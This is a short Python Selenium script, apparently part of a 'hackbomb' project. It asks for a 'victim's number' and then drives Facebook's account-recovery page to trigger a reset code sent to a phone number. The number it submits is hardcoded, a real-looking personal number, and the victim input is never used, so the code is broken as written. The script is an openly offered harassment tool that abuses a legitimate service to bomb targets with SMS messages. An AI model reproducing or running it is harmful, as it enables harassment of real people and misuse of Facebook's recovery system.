import selenium
from selenium import webdriver

import time

victim = input(">>>>>\tEnter victim's number along with country code ==> ")

browser = webdriver.Chrome("C:\\Users\\jatin Yadav\\Desktop\\hackbomb\\chromedriver.exe")
browser.get("https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login")

number = browser.find_element_by_xpath('//*[@id="identify_email"]')
number.send_keys('+917007886882')
did_submit = browser.find_element_by_name('did_submit')
did_submit.click()

time.sleep(3)
send = browser.find_element_by_xpath('//*[@id="initiate_interstitial"]/div[2]/div/div[1]/button')
send.click()

browser.close()
